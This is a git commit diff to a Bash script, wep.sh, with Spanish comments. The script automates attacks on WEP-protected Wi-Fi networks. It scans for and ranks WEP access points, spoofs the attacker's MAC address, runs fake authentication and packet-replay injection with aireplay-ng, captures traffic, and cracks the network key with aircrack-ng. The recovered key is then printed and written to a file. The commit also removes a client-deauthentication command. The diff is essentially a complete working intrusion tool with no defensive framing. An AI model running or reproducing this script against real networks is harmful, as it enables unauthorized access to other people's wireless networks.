f35a1d318928b627c9077c9a574fa7a9d6c77d2f
oscar <oscar@macprod.(none)>
2010-09-15 17:09:13 +0200

    mejorado wep.sh

--- scripts/wep.sh
+++ scripts/wep.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 # Redux supercutre de airoscript usando Arp Replay.
 set -o nounset
+set -o posix
 trap clean INT TERM EXIT
 
 verde() { echo -ne "\e[32m# $1\e[m"; }
@@ -10,11 +11,13 @@ RND="cap_$RANDOM$RANDOM"
 clean() {
     verde "Bajando adaptadores en modo monitor:\n"
     airmon-ng | sed -n 's@^\(mon[0-9]\+\).*@\1@p'| xargs -n1 airmon-ng stop | grep -v '^$'
-    verde "Limpiando temporales:\n"
-    rm -v $RND* replay_arp* 2>/dev/null
+    verde "Limpiando temporales y matando procesos que puedan quedar:\n"
+    rm -v $RND* replay_* 2>/dev/null
+    pgrep -f $RND | xargs kill -9 2>/dev/null
     verde "OK\n"
 }
 
+# Verificamos binarios.
 verde "System check!\n"
 which screen airmon-ng airodump-ng aireplay-ng aircrack-ng macchanger ifconfig iwlist || exit 1
 
@@ -26,8 +29,11 @@ verde "Iniciamos Adaptador, escribiremos en ${RND}.*"
 airmon-ng start wlan0 || exit 1
 time screen -S airodump airodump-ng -w $RND mon0
 
+# Ordenamos el listado de APs detectados por su señal.
+sort -V -t"," -k 9 $RND-01.csv > $RND-01.csv.sorted
+
 # Listamos los aps bajo WEP detectados.
-verde "APs detectados:\n"
+verde "APs detectados de mejor a peor señal:\n"
 i=0
 while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
 if [ "$PRIVACY" = " WEP " ]; then
@@ -37,46 +43,51 @@ if [ "$PRIVACY" = " WEP " ]; then
     achannel[$i]=${CHANNEL// /}
     amac[$i]=${MAC// /}
 fi
-done < $RND-01.csv
+done < $RND-01.csv.sorted
 [ $i -eq 0 ] && exit 1
-verde "Seleccionar AP del 1 al $i:\n"
-read -r choice
-[ -z ${amac[$choice]} ] && exit 1
 
-# Paso de martillear el AP con mi mac.
+# Loop hasta conseguir un input correcto
+while true; do
+    verde "Seleccionar AP del 1 al $i:\n"
+    read -r choice
+    [ $choice -ge 1 ] && [ $choice -le $i ] && break
+done
+
+# Paso de martillear el AP con mi mac adress.
 verde "Falseando MAC:\n"
 ifconfig mon0 down
 macchanger -A mon0
 MYMAC=$(macchanger -s mon0 | sed -n 's/Current MAC: \([0-9a-f\:]\+\) (.*/\1/p')
+verde "Nuestra MAC ahora es $MYMAC"
+airmon-ng stop mon0
 verde "Ponemos la interficie monitor en el canal ${achannel[$choice]}:\n"
-iwconfig mon0 channel ${achannel[$choice]}
+airmon-ng start wlan0 ${achannel[$choice]}
 iwlist mon0 channel
 
 # Creamos un fichero .screenrc custom para 'splitear' aireplay/airodump en una sesión de screen.
 cat > ${RND}.screenrc <<EOF
 startup_message off
 zombie cr
-bind ^b screen -t Deauth 3 aireplay-ng -0 5 -a ${amac[$choice]} -c \$(sed -n 's@^\([0-9A-F:]\{17\}\),.*@\1@p' < $RND-02.csv | grep -iv ${amac[$choice]} | grep -iv $MYMAC) mon0
 screen -t Auth   0 aireplay-ng -1 6000 -o 1 -q 10 -e ${aessid[$choice]} -a ${amac[$choice]} -h $MYMAC mon0
 split
 focus
-screen -t Replay 1 aireplay-ng -3 -x 50 -b ${amac[$choice]} -h $MYMAC mon0
+screen -t Replay 1 aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b ${amac[$choice]} -h $MYMAC mon0
 split
 focus
 screen -t Dump   2 airodump-ng -c ${achannel[$choice]} --bssid ${amac[$choice]} -w $RND mon0
-resize +6
+split
+focus
+screen -t Crack  3 aircrack-ng -0 -b ${amac[$choice]} -l ${RND}.key ${RND}-02.cap
 EOF
-
-# Deauth
-# aireplay-ng --deauth 5 -a ${amac[$choice]} -c $(sed -n 's@^\([0-9A-F:]\{17\}\),.*$@\1@p' < $RND-02.csv) mon0
 
 # Efectuamos el ataque en si.
 verde "Ataque ARP REPLAY\n"
 time screen -S wepfrit -c ${RND}.screenrc
 
-# Buscamos las clave con los IV obtenidos.
-verde "Búsqueda de clave por método PTW\n"
-time screen -S aircrack aircrack-ng -z -0 -f2 -b ${amac[$choice]} -l ${aessid[$choice]}.key ${RND}*.cap
-
 # Presentamos la clave si aplica.
-[ -f ${aessid[$choice]}.key ] && { verde "Clave encontrada:\n "; cat ${aessid[$choice]}.key; echo ; read; }
+[ -f $RND.key ] && {
+    OUTSTR="${aessid[$choice]} CH: ${achannel[$choice]} MAC: ${amac[$choice]} KEY: $(cat $RND.key)"
+    verde "Clave encontrada:\n\n"
+    verde "$OUTSTR\n\n"
+    touch "$OUTSTR"
+}
